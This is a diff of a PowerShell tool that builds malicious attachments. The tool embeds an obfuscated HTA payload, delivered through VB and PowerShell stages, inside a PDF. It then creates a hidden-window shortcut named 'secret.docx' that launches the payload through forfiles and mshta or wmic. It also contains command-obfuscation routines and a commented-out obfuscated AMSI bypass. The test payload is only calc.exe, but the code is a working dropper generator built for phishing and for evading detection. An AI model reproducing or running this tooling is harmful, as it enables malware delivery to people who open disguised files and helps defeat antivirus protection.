@@ -1,17 +1,3 @@
-[CmdletBinding()]
-param (
-    [Parameter()]
-    [string]
-    $LnkBase = ".\assets\kittycat.jpeg",
-
-    [Parameter()]
-    [string]
-    $HtaBase = ".\assets\random.pdf",
-
-    [Parameter(Mandatory)]
-    [string]
-    $Url
-)
 
 function Get-RandomStrings {
     param (
@@ -84,6 +70,9 @@ function Set-RandomQuotes {
         [string]$String,
         [switch]$Add
     )
+    if ($String[0] -ne "'"){
+        return $String
+    }
     $maxCount = Get-MaxCount $String.Length
     $minCount = Get-MinCount $String.Length
     $randQuoteCount = ($minCount..$maxCount) | Get-Random -Count 1
@@ -94,7 +83,7 @@ function Set-RandomQuotes {
         "'+'"
     }
     $quotedCommand = for ($i = 0; $i -lt $String.Length; $i++){
-        if ((@($randQuoteIndexes).Contains($i)) -and !(@(' ', '.', '-', '(') -contains $String[($i-1)])){
+        if ((@($randQuoteIndexes).Contains($i)) -and !(@(' ', '.', '-', '(', ',') -contains $String[($i-1)])){
             $quote + $String[$i] 
         }
         else {
@@ -123,6 +112,25 @@ function New-ObfuscatedDownloader {
     $randCase[4] = "(" + $randCase[4] + ")"
     -join $randCase
 }
+
+function New-ObfuscatedCommand {
+    param (
+        [string]$Command
+    )
+    $splittedCommand = @($Command -split '[()]' | Where-Object {$_ -ne ""}) 
+    Write-Host $splittedCommand.Length
+    $obfuscated = for ($i = 0; $i -lt $splittedCommand.Length; $i++) {
+        if ($splittedCommand[$i].Length -eq 1) {
+            $splittedCommand[$i]
+        } else {
+            $randCase = Set-RandomUppercase $splittedCommand[$i]
+            Write-Host $randCase
+            "(" + $(Set-RandomQuotes $randCase  -Add) + ")"
+        }
+    } 
+    -join $obfuscated
+}
+
 
 function Get-Base64Encoded {
     param (
@@ -352,12 +360,12 @@ function New-SecondStageVBLauncher {
 
 function New-InsertHtaToPDF {
     param (
-        [string]$Path,
+        [string]$OriginalPdf,
         [string]$HtaPayload,
         [string]$Dest
     )
-    $newPdf = [System.IO.FileStream]::new("$Dest\random.pdf", [System.IO.FileMode]::Create)
-    $pdfBytes = [System.IO.File]::ReadAllBytes($Path)
+    $newPdf = [System.IO.FileStream]::new($Dest, [System.IO.FileMode]::Create)
+    $pdfBytes = [System.IO.File]::ReadAllBytes($OriginalPdf)
     $pdfText = [System.Text.Encoding]::ASCII.GetString($pdfBytes)
     $header = [System.Text.Encoding]::ASCII.GetBytes("%PDF-1.7`n")
     $newPdf.Write($header, 0, $header.Length)
@@ -415,24 +423,37 @@ endobj`n
 function New-LnkFile {
     param (
        [string] $Dest,
-       [string] $IconPath,
-       [string] $Target
+       [int] $IconNumber,
+       [string] $Target,
+       [switch] $Wmic
     )
     $shell = New-Object -ComObject WScript.Shell
     $lnk = $shell.CreateShortcut("$Dest.lnk")
-    $lnk.TargetPath = ".\forfiles.exe"
-    $lnk.Arguments = "/M $Target /C `"cmd /c mshta @path`""
-    $lnk.IconLocation = $IconPath
+    $lnk.TargetPath = "%systemroot%\system32\forfiles.exe"
+    $lnk.WindowStyle = 7 # hidden
+    $mshtaCmd = "mshta @path"
+    $cmd = if ($Wmic) {
+        "wmic process call create `"$mshtaCmd`""
+    }
+    else {
+        "%comspec% /c $mshtaCmd"
+    }
+    $lnk.Arguments = "/M $Target /C `"$cmd`""
+    $lnk.IconLocation = "%systemroot%\system32\imageres.dll,$IconNumber"
     $lnk.Save()
 }
-#$downloader = New-ObfuscatedDownloader -Url ttotot
-$test = "iex calc.exe"
-$psLauncher = New-PowershellLauncher -Payload $test
+#$amsi = "[Ref]." + (New-ObfuscatedCommand "('Assembly').('GetType')") + "('System.Management.Automation.AmsiUtils')." + (New-ObfuscatedCommand "('GetField')")+"('amsiInitFailed','NonPublic,Static')"+ (New-ObfuscatedCommand ".('SetValue')(`$null,`$true)")
+#Write-Output $amsi
+$calc = "iex calc.exe"
+$psLauncher = New-PowershellLauncher -Payload $calc
 $secondStage = New-SecondStageVBLauncher -Payload $psLauncher
 $payload = New-FirstStageVBLauncher -Payload $secondStage
 $defaultDir = ".\payload"
+$pdfFilename = "random.pdf"
+$lnkFileName = "secret.docx"
+$origninalPdf = ".\assets\random.pdf"
 if (!(Test-Path -Path $defaultDir -PathType Container)){
     New-Item -ItemType Directory $defaultDir
 }
-New-InsertHtaToPDF -Path $HtaBase -HtaPayload $payload -Dest .\payload
-New-LnkFile -Target random.pdf -Dest .\payload\kittycat.jpeg -IconPath .\assets\kittycat.jpeg
+New-InsertHtaToPDF -OriginalPdf $origninalPdf -HtaPayload $payload -Dest "$($defaultDir)\$($pdfFileName)"
+New-LnkFile -Target $pdfFilename -Dest "$($defaultDir)\$($lnkFileName)" -IconNumber 340
